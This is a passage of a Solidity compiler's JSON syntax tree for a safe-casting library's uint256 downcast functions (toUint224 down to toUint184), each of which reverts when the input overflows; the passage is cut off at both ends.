pure"}},"id":3809,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3244:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint224","typeString":"type(uint224)"}},"id":3810,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"3258:3:7","memberName":"max","nodeType":"MemberAccess","src":"3244:17:7","typeDescriptions":{"typeIdentifier":"t_uint224","typeString":"uint224"}},"src":"3236:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3818,"nodeType":"IfStatement","src":"3232:105:7","trueBody":{"id":3817,"nodeType":"Block","src":"3263:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323234","id":3813,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3315:3:7","typeDescriptions":{"typeIdentifier":"t_rational_224_by_1","typeString":"int_const 224"},"value":"224"},{"id":3814,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3800,"src":"3320:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_224_by_1","typeString":"int_const 224"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3812,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"3284:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3815,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3284:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3816,"nodeType":"RevertStatement","src":"3277:49:7"}]}},{"expression":{"arguments":[{"id":3821,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3800,"src":"3361:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3820,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3353:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint224_$","typeString":"type(uint224)"},"typeName":{"id":3819,"name":"uint224","nodeType":"ElementaryTypeName","src":"3353:7:7","typeDescriptions":{}}},"id":3822,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3353:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint224","typeString":"uint224"}},"functionReturnParameters":3804,"id":3823,"nodeType":"Return","src":"3346:21:7"}]},"documentation":{"id":3798,"nodeType":"StructuredDocumentation","src":"2871:280:7","text":" @dev Returns the downcasted uint224 from uint256, reverting on\n overflow (when the input is greater than largest uint224).\n Counterpart to Solidity's `uint224` operator.\n Requirements:\n - input must fit into 224 bits"},"id":3825,"implemented":true,"kind":"function","modifiers":[],"name":"toUint224","nameLocation":"3165:9:7","nodeType":"FunctionDefinition","parameters":{"id":3801,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3800,"mutability":"mutable","name":"value","nameLocation":"3183:5:7","nodeType":"VariableDeclaration","scope":3825,"src":"3175:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3799,"name":"uint256","nodeType":"ElementaryTypeName","src":"3175:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3174:15:7"},"returnParameters":{"id":3804,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3803,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3825,"src":"3213:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint224","typeString":"uint224"},"typeName":{"id":3802,"name":"uint224","nodeType":"ElementaryTypeName","src":"3213:7:7","typeDescriptions":{"typeIdentifier":"t_uint224","typeString":"uint224"}},"visibility":"internal"}],"src":"3212:9:7"},"scope":5451,"src":"3156:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3852,"nodeType":"Block","src":"3731:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3839,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3833,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3828,"src":"3745:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3836,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3758:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint216_$","typeString":"type(uint216)"},"typeName":{"id":3835,"name":"uint216","nodeType":"ElementaryTypeName","src":"3758:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint216_$","typeString":"type(uint216)"}],"id":3834,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"3753:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3837,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3753:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint216","typeString":"type(uint216)"}},"id":3838,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"3767:3:7","memberName":"max","nodeType":"MemberAccess","src":"3753:17:7","typeDescriptions":{"typeIdentifier":"t_uint216","typeString":"uint216"}},"src":"3745:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3846,"nodeType":"IfStatement","src":"3741:105:7","trueBody":{"id":3845,"nodeType":"Block","src":"3772:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323136","id":3841,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3824:3:7","typeDescriptions":{"typeIdentifier":"t_rational_216_by_1","typeString":"int_const 216"},"value":"216"},{"id":3842,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3828,"src":"3829:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_216_by_1","typeString":"int_const 216"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3840,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"3793:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3843,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3793:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3844,"nodeType":"RevertStatement","src":"3786:49:7"}]}},{"expression":{"arguments":[{"id":3849,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3828,"src":"3870:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3848,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3862:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint216_$","typeString":"type(uint216)"},"typeName":{"id":3847,"name":"uint216","nodeType":"ElementaryTypeName","src":"3862:7:7","typeDescriptions":{}}},"id":3850,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3862:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint216","typeString":"uint216"}},"functionReturnParameters":3832,"id":3851,"nodeType":"Return","src":"3855:21:7"}]},"documentation":{"id":3826,"nodeType":"StructuredDocumentation","src":"3380:280:7","text":" @dev Returns the downcasted uint216 from uint256, reverting on\n overflow (when the input is greater than largest uint216).\n Counterpart to Solidity's `uint216` operator.\n Requirements:\n - input must fit into 216 bits"},"id":3853,"implemented":true,"kind":"function","modifiers":[],"name":"toUint216","nameLocation":"3674:9:7","nodeType":"FunctionDefinition","parameters":{"id":3829,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3828,"mutability":"mutable","name":"value","nameLocation":"3692:5:7","nodeType":"VariableDeclaration","scope":3853,"src":"3684:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3827,"name":"uint256","nodeType":"ElementaryTypeName","src":"3684:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3683:15:7"},"returnParameters":{"id":3832,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3831,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3853,"src":"3722:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint216","typeString":"uint216"},"typeName":{"id":3830,"name":"uint216","nodeType":"ElementaryTypeName","src":"3722:7:7","typeDescriptions":{"typeIdentifier":"t_uint216","typeString":"uint216"}},"visibility":"internal"}],"src":"3721:9:7"},"scope":5451,"src":"3665:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3880,"nodeType":"Block","src":"4240:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3867,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3861,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3856,"src":"4254:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3864,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4267:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint208_$","typeString":"type(uint208)"},"typeName":{"id":3863,"name":"uint208","nodeType":"ElementaryTypeName","src":"4267:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint208_$","typeString":"type(uint208)"}],"id":3862,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"4262:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3865,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4262:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint208","typeString":"type(uint208)"}},"id":3866,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"4276:3:7","memberName":"max","nodeType":"MemberAccess","src":"4262:17:7","typeDescriptions":{"typeIdentifier":"t_uint208","typeString":"uint208"}},"src":"4254:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3874,"nodeType":"IfStatement","src":"4250:105:7","trueBody":{"id":3873,"nodeType":"Block","src":"4281:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323038","id":3869,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4333:3:7","typeDescriptions":{"typeIdentifier":"t_rational_208_by_1","typeString":"int_const 208"},"value":"208"},{"id":3870,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3856,"src":"4338:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_208_by_1","typeString":"int_const 208"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3868,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"4302:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3871,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4302:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3872,"nodeType":"RevertStatement","src":"4295:49:7"}]}},{"expression":{"arguments":[{"id":3877,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3856,"src":"4379:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3876,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4371:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint208_$","typeString":"type(uint208)"},"typeName":{"id":3875,"name":"uint208","nodeType":"ElementaryTypeName","src":"4371:7:7","typeDescriptions":{}}},"id":3878,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4371:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint208","typeString":"uint208"}},"functionReturnParameters":3860,"id":3879,"nodeType":"Return","src":"4364:21:7"}]},"documentation":{"id":3854,"nodeType":"StructuredDocumentation","src":"3889:280:7","text":" @dev Returns the downcasted uint208 from uint256, reverting on\n overflow (when the input is greater than largest uint208).\n Counterpart to Solidity's `uint208` operator.\n Requirements:\n - input must fit into 208 bits"},"id":3881,"implemented":true,"kind":"function","modifiers":[],"name":"toUint208","nameLocation":"4183:9:7","nodeType":"FunctionDefinition","parameters":{"id":3857,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3856,"mutability":"mutable","name":"value","nameLocation":"4201:5:7","nodeType":"VariableDeclaration","scope":3881,"src":"4193:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3855,"name":"uint256","nodeType":"ElementaryTypeName","src":"4193:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4192:15:7"},"returnParameters":{"id":3860,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3859,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3881,"src":"4231:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint208","typeString":"uint208"},"typeName":{"id":3858,"name":"uint208","nodeType":"ElementaryTypeName","src":"4231:7:7","typeDescriptions":{"typeIdentifier":"t_uint208","typeString":"uint208"}},"visibility":"internal"}],"src":"4230:9:7"},"scope":5451,"src":"4174:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3908,"nodeType":"Block","src":"4749:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3895,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3889,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3884,"src":"4763:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3892,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4776:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint200_$","typeString":"type(uint200)"},"typeName":{"id":3891,"name":"uint200","nodeType":"ElementaryTypeName","src":"4776:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint200_$","typeString":"type(uint200)"}],"id":3890,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"4771:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3893,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4771:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint200","typeString":"type(uint200)"}},"id":3894,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"4785:3:7","memberName":"max","nodeType":"MemberAccess","src":"4771:17:7","typeDescriptions":{"typeIdentifier":"t_uint200","typeString":"uint200"}},"src":"4763:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3902,"nodeType":"IfStatement","src":"4759:105:7","trueBody":{"id":3901,"nodeType":"Block","src":"4790:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323030","id":3897,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4842:3:7","typeDescriptions":{"typeIdentifier":"t_rational_200_by_1","typeString":"int_const 200"},"value":"200"},{"id":3898,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3884,"src":"4847:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_200_by_1","typeString":"int_const 200"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3896,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"4811:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3899,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4811:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3900,"nodeType":"RevertStatement","src":"4804:49:7"}]}},{"expression":{"arguments":[{"id":3905,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3884,"src":"4888:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3904,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4880:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint200_$","typeString":"type(uint200)"},"typeName":{"id":3903,"name":"uint200","nodeType":"ElementaryTypeName","src":"4880:7:7","typeDescriptions":{}}},"id":3906,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4880:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint200","typeString":"uint200"}},"functionReturnParameters":3888,"id":3907,"nodeType":"Return","src":"4873:21:7"}]},"documentation":{"id":3882,"nodeType":"StructuredDocumentation","src":"4398:280:7","text":" @dev Returns the downcasted uint200 from uint256, reverting on\n overflow (when the input is greater than largest uint200).\n Counterpart to Solidity's `uint200` operator.\n Requirements:\n - input must fit into 200 bits"},"id":3909,"implemented":true,"kind":"function","modifiers":[],"name":"toUint200","nameLocation":"4692:9:7","nodeType":"FunctionDefinition","parameters":{"id":3885,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3884,"mutability":"mutable","name":"value","nameLocation":"4710:5:7","nodeType":"VariableDeclaration","scope":3909,"src":"4702:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3883,"name":"uint256","nodeType":"ElementaryTypeName","src":"4702:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4701:15:7"},"returnParameters":{"id":3888,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3887,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3909,"src":"4740:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint200","typeString":"uint200"},"typeName":{"id":3886,"name":"uint200","nodeType":"ElementaryTypeName","src":"4740:7:7","typeDescriptions":{"typeIdentifier":"t_uint200","typeString":"uint200"}},"visibility":"internal"}],"src":"4739:9:7"},"scope":5451,"src":"4683:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3936,"nodeType":"Block","src":"5258:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3923,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3917,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3912,"src":"5272:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3920,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5285:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint192_$","typeString":"type(uint192)"},"typeName":{"id":3919,"name":"uint192","nodeType":"ElementaryTypeName","src":"5285:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint192_$","typeString":"type(uint192)"}],"id":3918,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"5280:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3921,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5280:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint192","typeString":"type(uint192)"}},"id":3922,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"5294:3:7","memberName":"max","nodeType":"MemberAccess","src":"5280:17:7","typeDescriptions":{"typeIdentifier":"t_uint192","typeString":"uint192"}},"src":"5272:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3930,"nodeType":"IfStatement","src":"5268:105:7","trueBody":{"id":3929,"nodeType":"Block","src":"5299:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313932","id":3925,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5351:3:7","typeDescriptions":{"typeIdentifier":"t_rational_192_by_1","typeString":"int_const 192"},"value":"192"},{"id":3926,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3912,"src":"5356:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_192_by_1","typeString":"int_const 192"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3924,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"5320:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3927,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5320:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3928,"nodeType":"RevertStatement","src":"5313:49:7"}]}},{"expression":{"arguments":[{"id":3933,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3912,"src":"5397:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3932,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5389:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint192_$","typeString":"type(uint192)"},"typeName":{"id":3931,"name":"uint192","nodeType":"ElementaryTypeName","src":"5389:7:7","typeDescriptions":{}}},"id":3934,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5389:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint192","typeString":"uint192"}},"functionReturnParameters":3916,"id":3935,"nodeType":"Return","src":"5382:21:7"}]},"documentation":{"id":3910,"nodeType":"StructuredDocumentation","src":"4907:280:7","text":" @dev Returns the downcasted uint192 from uint256, reverting on\n overflow (when the input is greater than largest uint192).\n Counterpart to Solidity's `uint192` operator.\n Requirements:\n - input must fit into 192 bits"},"id":3937,"implemented":true,"kind":"function","modifiers":[],"name":"toUint192","nameLocation":"5201:9:7","nodeType":"FunctionDefinition","parameters":{"id":3913,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3912,"mutability":"mutable","name":"value","nameLocation":"5219:5:7","nodeType":"VariableDeclaration","scope":3937,"src":"5211:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3911,"name":"uint256","nodeType":"ElementaryTypeName","src":"5211:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5210:15:7"},"returnParameters":{"id":3916,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3915,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3937,"src":"5249:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint192","typeString":"uint192"},"typeName":{"id":3914,"name":"uint192","nodeType":"ElementaryTypeName","src":"5249:7:7","typeDescriptions":{"typeIdentifier":"t_uint192","typeString":"uint192"}},"visibility":"internal"}],"src":"5248:9:7"},"scope":5451,"src":"5192:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3964,"nodeType":"Block","src":"5767:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3951,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3945,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3940,"src":"5781:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3948,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5794:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint184_$","typeString":"type(uint184)"},"typeName":{"id":3947,"name":"uint184","nodeType":"ElementaryTypeName","src":"5794:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint184_$","typeString":"type(uint184)"}],"id":3946,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"5789:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3949,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5789:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint184","typeString":"type(uint184)"}},"id":3950,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"5803:3:7","memberName":"max","nodeType":"MemberAccess","src":"5789:17:7","typeDescriptions":{"typeIdentifier":"t_uint184","typeString":"uint184"}},"src":"5781:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3958,"nodeType":"IfStatement","src":"5777:105:7","trueBody":{"id":3957,"nodeType":"Block","src":"5808:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313834","id":3953,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5860:3:7","typeDescriptions":{"typeIdentifier":"t_rational_184_by_1","typeString":"int_const 184"},"value":"184"},{"id":3954,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3940,"src":"5865:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_184_by_1","typeString":"int_const 